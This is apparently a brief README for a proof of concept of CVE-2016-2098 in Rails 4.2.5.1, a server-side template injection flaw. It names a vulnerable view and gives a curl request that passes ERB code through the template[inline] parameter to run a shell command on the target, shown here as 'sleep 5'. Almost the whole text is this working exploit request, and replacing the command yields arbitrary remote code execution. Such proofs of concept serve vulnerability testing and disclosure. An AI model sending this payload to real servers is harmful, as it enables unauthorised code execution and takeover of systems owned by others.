# A PoC of CVE-2016-2098

* rails 4.2.5.1  
* view has a vulnerable code  
 app/views/poc/render1.html.erb  
* following command will cause remote code execution  
```$ curl '<your_host>:3000/poc/render1?template\[inline\]=<%25%3d`sleep+5`%25>'```  
